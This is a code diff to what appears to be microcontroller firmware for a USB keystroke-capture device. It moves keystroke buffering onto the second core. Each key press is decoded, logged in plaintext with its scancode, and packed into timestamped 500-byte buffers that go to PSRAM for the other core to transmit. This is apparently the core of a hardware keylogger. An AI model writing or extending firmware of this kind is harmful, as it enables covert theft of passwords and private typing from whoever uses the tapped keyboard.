@@ -16,8 +16,13 @@
 #include "keyboard_decoder_core1.h"
 #include "common.h"
 #include "keystroke_queue.h"
+#include "formatted_event_queue.h"  /* For API compatibility (formatted_queue_t parameter) */
+#include "psram_buffer.h"
 #include "pico/time.h"  /* For time_us_64() */
+#include "configuration.h"  /* For LOG_INFO */
 #include <string.h>
+#include <stdio.h>
+#include <Arduino.h>
 
 extern "C" {
 
@@ -47,12 +52,122 @@ static const char hid_to_ascii_shift[128] = {
 /* Keyboard state tracking */
 static keyboard_state_t g_keyboard_state_core1;
 
-/* Keystroke queue pointer (set during init) */
+/* Queue pointers (set during init) */
 static keystroke_queue_t *g_keystroke_queue = NULL;
 
-void keyboard_decoder_core1_init(keystroke_queue_t *queue)
+/* ============================================================================
+ * CORE1 KEYSTROKE BUFFER MANAGEMENT
+ * ============================================================================
+ * Core1 now owns the keystroke buffer and all buffer operations.
+ * When a buffer is finalized, it is written to PSRAM for Core0 to transmit.
+ */
+
+/* Buffer constants (from USBCaptureModule) */
+#define KEYSTROKE_BUFFER_SIZE 500
+#define EPOCH_SIZE 10
+#define KEYSTROKE_DATA_START EPOCH_SIZE
+#define KEYSTROKE_DATA_END (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)
+#define DELTA_MARKER 0xFF
+#define DELTA_SIZE 2
+#define DELTA_TOTAL_SIZE 3
+#define DELTA_MAX_SAFE 65000
+
+/* Core1's keystroke buffer */
+static char g_core1_keystroke_buffer[KEYSTROKE_BUFFER_SIZE];
+static size_t g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
+static bool g_core1_buffer_initialized = false;
+static uint32_t g_core1_buffer_start_epoch = 0;
+
+/* Forward declarations for buffer helper functions */
+static void core1_write_epoch_at(size_t pos);
+static void core1_write_delta_at(size_t pos, uint16_t delta);
+static void core1_init_keystroke_buffer();
+static size_t core1_get_buffer_space();
+static bool core1_add_to_buffer(char c);
+static bool core1_add_enter_to_buffer();
+static void core1_finalize_buffer();
+
+/**
+ * @brief Format and log keystroke event directly on Core1
+ *
+ * Core1 formats and logs events immediately, eliminating the need
+ * for Core0 to process a formatted event queue.
+ *
+ * @param event Keystroke event to format and log
+ */
+static void format_and_log_event(const keystroke_event_t *event)
+{
+    char formatted_text[MAX_FORMATTED_LEN];
+
+    /* Format the event text based on type */
+    switch (event->type)
+    {
+    case KEYSTROKE_TYPE_CHAR:
+        snprintf(formatted_text, MAX_FORMATTED_LEN, "CHAR '%c' (scancode=0x%02x, mod=0x%02x)",
+                 event->character, event->scancode, event->modifier);
+        break;
+
+    case KEYSTROKE_TYPE_BACKSPACE:
+        snprintf(formatted_text, MAX_FORMATTED_LEN, "BACKSPACE");
+        break;
+
+    case KEYSTROKE_TYPE_ENTER:
+        snprintf(formatted_text, MAX_FORMATTED_LEN, "ENTER");
+        break;
+
+    case KEYSTROKE_TYPE_TAB:
+        snprintf(formatted_text, MAX_FORMATTED_LEN, "TAB");
+        break;
+
+    case KEYSTROKE_TYPE_ERROR:
+        if (event->error_flags == 0xDEADC1C1)
+        {
+            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_ERROR: PIO configuration failed!");
+        }
+        else
+        {
+            snprintf(formatted_text, MAX_FORMATTED_LEN, "ERROR (flags=0x%08x)", event->error_flags);
+        }
+        break;
+
+    case KEYSTROKE_TYPE_RESET:
+        /* Decode Core1 status codes */
+        if (event->scancode == 0xC1)
+        {
+            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_STATUS: Core1 entry point reached");
+        }
+        else if (event->scancode == 0xC2)
+        {
+            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_STATUS: Starting PIO configuration...");
+        }
+        else if (event->scancode == 0xC3)
+        {
+            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_STATUS: PIO configured successfully");
+        }
+        else if (event->scancode == 0xC4)
+        {
+            snprintf(formatted_text, MAX_FORMATTED_LEN, "CORE1_STATUS: Ready to capture USB data");
+        }
+        else
+        {
+            snprintf(formatted_text, MAX_FORMATTED_LEN, "RESET (scancode=0x%02x)", event->scancode);
+        }
+        break;
+
+    default:
+        snprintf(formatted_text, MAX_FORMATTED_LEN, "UNKNOWN (type=%d)", event->type);
+        break;
+    }
+
+    /* Log directly on Core1 */
+    LOG_INFO("[Core1] %s", formatted_text);
+}
+
+void keyboard_decoder_core1_init(keystroke_queue_t *queue, formatted_event_queue_t *formatted_queue)
 {
     g_keystroke_queue = queue;
+    /* formatted_queue parameter kept for API compatibility but not used -
+     * Core1 logs directly now instead of queuing formatted events */
     keyboard_decoder_core1_reset();
 }
 
@@ -131,12 +246,15 @@ void keyboard_decoder_core1_process_report(uint8_t *data, int size, uint32_t tim
             keystroke_event_t event;
 
             /* Determine event type and create appropriate event */
+            bool added = false;
             if (keycode == HID_SCANCODE_ENTER)
             {
                 /* Enter key */
                 event = keystroke_event_create_special(
                     KEYSTROKE_TYPE_ENTER, keycode, capture_timestamp_us);
                 keystroke_queue_push(g_keystroke_queue, &event);
+                format_and_log_event(&event);  /* Log directly on Core1 */
+                added = core1_add_enter_to_buffer();  /* Add to Core1 buffer */
             }
             else if (keycode == HID_SCANCODE_BACKSPACE)
             {
@@ -144,6 +262,8 @@ void keyboard_decoder_core1_process_report(uint8_t *data, int size, uint32_t tim
                 event = keystroke_event_create_special(
                     KEYSTROKE_TYPE_BACKSPACE, keycode, capture_timestamp_us);
                 keystroke_queue_push(g_keystroke_queue, &event);
+                format_and_log_event(&event);  /* Log directly on Core1 */
+                added = core1_add_to_buffer('\b');  /* Add to Core1 buffer */
             }
             else if (keycode == HID_SCANCODE_TAB)
             {
@@ -151,6 +271,8 @@ void keyboard_decoder_core1_process_report(uint8_t *data, int size, uint32_t tim
                 event = keystroke_event_create_special(
                     KEYSTROKE_TYPE_TAB, keycode, capture_timestamp_us);
                 keystroke_queue_push(g_keystroke_queue, &event);
+                format_and_log_event(&event);  /* Log directly on Core1 */
+                added = core1_add_to_buffer('\t');  /* Add to Core1 buffer */
             }
             else
             {
@@ -161,6 +283,28 @@ void keyboard_decoder_core1_process_report(uint8_t *data, int size, uint32_t tim
                     event = keystroke_event_create_char(
                         ch, keycode, modifier, capture_timestamp_us);
                     keystroke_queue_push(g_keystroke_queue, &event);
+                    format_and_log_event(&event);  /* Log directly on Core1 */
+                    added = core1_add_to_buffer(ch);  /* Add to Core1 buffer */
+                }
+            }
+
+            /* If buffer is full, finalize and retry */
+            if (!added)
+            {
+                core1_finalize_buffer();
+
+                /* Retry adding to new buffer */
+                if (keycode == HID_SCANCODE_ENTER)
+                    core1_add_enter_to_buffer();
+                else if (keycode == HID_SCANCODE_BACKSPACE)
+                    core1_add_to_buffer('\b');
+                else if (keycode == HID_SCANCODE_TAB)
+                    core1_add_to_buffer('\t');
+                else
+                {
+                    char ch = conv_table[keycode];
+                    if (ch != 0)
+                        core1_add_to_buffer(ch);
                 }
             }
         }
@@ -175,4 +319,139 @@ const keyboard_state_t *keyboard_decoder_core1_get_state(void)
 {
     return &g_keyboard_state_core1;
 }
+
+/* ============================================================================
+ * CORE1 BUFFER MANAGEMENT FUNCTIONS
+ * ============================================================================
+ * These functions were moved from USBCaptureModule.cpp to Core1.
+ * Core1 now handles all keystroke buffering and writes complete buffers
+ * to PSRAM for Core0 to transmit.
+ */
+
+static void core1_write_epoch_at(size_t pos)
+{
+    /* Get current uptime as 10-digit ASCII string (seconds since boot)
+     * Note: This is uptime, not unix epoch. For true unix time, an RTC would be needed.
+     * The delta encoding still works correctly with relative timestamps. */
+    uint32_t epoch = (uint32_t)(millis() / 1000);
+    snprintf(&g_core1_keystroke_buffer[pos], EPOCH_SIZE + 1, "%010u", epoch);
+}
+
+static void core1_write_delta_at(size_t pos, uint16_t delta)
+{
+    /* Write 2-byte delta in big-endian format */
+    g_core1_keystroke_buffer[pos] = (char)((delta >> 8) & 0xFF);
+    g_core1_keystroke_buffer[pos + 1] = (char)(delta & 0xFF);
+}
+
+static void core1_init_keystroke_buffer()
+{
+    memset(g_core1_keystroke_buffer, 0, KEYSTROKE_BUFFER_SIZE);
+    g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
+
+    /* Store start epoch for delta calculations */
+    g_core1_buffer_start_epoch = (uint32_t)(millis() / 1000);
+
+    /* Write start epoch at position 0 */
+    core1_write_epoch_at(0);
+    g_core1_buffer_initialized = true;
+}
+
+static size_t core1_get_buffer_space()
+{
+    if (g_core1_buffer_write_pos >= KEYSTROKE_DATA_END)
+        return 0;
+    return KEYSTROKE_DATA_END - g_core1_buffer_write_pos;
+}
+
+static bool core1_add_to_buffer(char c)
+{
+    if (!g_core1_buffer_initialized)
+    {
+        core1_init_keystroke_buffer();
+    }
+
+    /* Need at least 1 byte for char */
+    if (core1_get_buffer_space() < 1)
+    {
+        return false;
+    }
+
+    g_core1_keystroke_buffer[g_core1_buffer_write_pos++] = c;
+    return true;
+}
+
+static bool core1_add_enter_to_buffer()
+{
+    if (!g_core1_buffer_initialized)
+    {
+        core1_init_keystroke_buffer();
+    }
+
+    /* Calculate delta from buffer start */
+    uint32_t current_epoch = (uint32_t)(millis() / 1000);
+    uint32_t delta = current_epoch - g_core1_buffer_start_epoch;
+
+    /* If delta exceeds safe limit, force finalization and start fresh */
+    if (delta > DELTA_MAX_SAFE)
+    {
+        core1_finalize_buffer();
+        core1_init_keystroke_buffer();
+        /* Recalculate delta with new buffer start */
+        delta = 0;
+    }
+
+    /* Need 3 bytes: marker + 2-byte delta */
+    if (core1_get_buffer_space() < DELTA_TOTAL_SIZE)
+    {
+        return false;
+    }
+
+    /* Write marker byte followed by delta */
+    g_core1_keystroke_buffer[g_core1_buffer_write_pos++] = DELTA_MARKER;
+    core1_write_delta_at(g_core1_buffer_write_pos, (uint16_t)delta);
+    g_core1_buffer_write_pos += DELTA_SIZE;
+
+    return true;
+}
+
+static void core1_finalize_buffer()
+{
+    if (!g_core1_buffer_initialized)
+        return;
+
+    /* Write final epoch at position 490 */
+    core1_write_epoch_at(KEYSTROKE_DATA_END);
+
+    /* Create PSRAM buffer from keystroke buffer */
+    psram_keystroke_buffer_t psram_buf;
+
+    /* Parse epoch timestamps (copy to temp buffer with null terminator) */
+    char epoch_temp[EPOCH_SIZE + 1];
+
+    memcpy(epoch_temp, &g_core1_keystroke_buffer[0], EPOCH_SIZE);
+    epoch_temp[EPOCH_SIZE] = '\0';
+    sscanf(epoch_temp, "%u", &psram_buf.start_epoch);
+
+    memcpy(epoch_temp, &g_core1_keystroke_buffer[KEYSTROKE_DATA_END], EPOCH_SIZE);
+    epoch_temp[EPOCH_SIZE] = '\0';
+    sscanf(epoch_temp, "%u", &psram_buf.final_epoch);
+
+    /* Copy keystroke data */
+    psram_buf.data_length = g_core1_buffer_write_pos - KEYSTROKE_DATA_START;
+    memcpy(psram_buf.data, &g_core1_keystroke_buffer[KEYSTROKE_DATA_START], psram_buf.data_length);
+    psram_buf.flags = 0;
+
+    /* Write to PSRAM for Core0 to transmit */
+    if (!psram_buffer_write(&psram_buf))
+    {
+        /* Buffer full - Core0 slow to transmit, log error directly on Core1 */
+        LOG_INFO("[Core1] PSRAM buffer full (%u bytes dropped)", psram_buf.data_length);
+    }
+
+    /* Reset for next buffer */
+    g_core1_buffer_initialized = false;
+    g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
+}
+
 }
